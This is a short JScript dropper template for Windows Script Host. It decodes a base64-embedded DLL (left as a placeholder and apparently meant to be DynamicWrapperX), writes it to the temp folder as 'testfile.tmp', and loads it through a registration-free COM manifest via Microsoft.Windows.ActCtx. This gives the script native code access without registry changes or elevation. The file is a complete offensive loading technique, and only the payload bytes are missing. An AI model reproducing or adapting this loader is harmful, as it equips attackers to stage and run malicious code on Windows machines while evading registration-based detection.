var fileName = 'testfile.tmp';
var classObj = 'coolObjectName';
var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="' + classObj + '" version="2.2.0.0"/> 	<file name="' + fileName + '">     	<comClass         	description="' + classObj + ' Class"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="' + classObj + '"/> 	</file>  </assembly>';
var fso = new ActiveXObject("Scripting.FileSystemObject");
var dropPath = fso.GetSpecialFolder(2);

var Base64={characters:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){Base64.characters;var r="",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};

function Magic(r){if(!/^[a-z0-9+/]+={0,2}$/i.test(r)||r.length%4!=0)throw Error("Not base64 string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<r.length;d+=4)t=(a=f.indexOf(r.charAt(d))<<18|f.indexOf(r.charAt(d+1))<<12|(o=f.indexOf(r.charAt(d+2)))<<6|(i=f.indexOf(r.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return r=h.join("")}
function binaryWriter(res,filename)
{var base64decoded=Magic(res);var TextStream=new ActiveXObject('ADODB.Stream');TextStream.Type=2;TextStream.charSet='iso-8859-1';TextStream.Open();TextStream.WriteText(base64decoded);var BinaryStream=new ActiveXObject('ADODB.Stream');BinaryStream.Type=1;BinaryStream.Open();TextStream.Position=0;TextStream.CopyTo(BinaryStream);BinaryStream.SaveToFile(filename,2);BinaryStream.Close()}

var dynwrapX = 'B64DLL_BYTES_GO_HERE';

binaryWriter(dynwrapX,dropPath+"\\" + fileName);


var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
ax.ManifestText = manifest;

var DWX = ax.CreateObject(classObj);
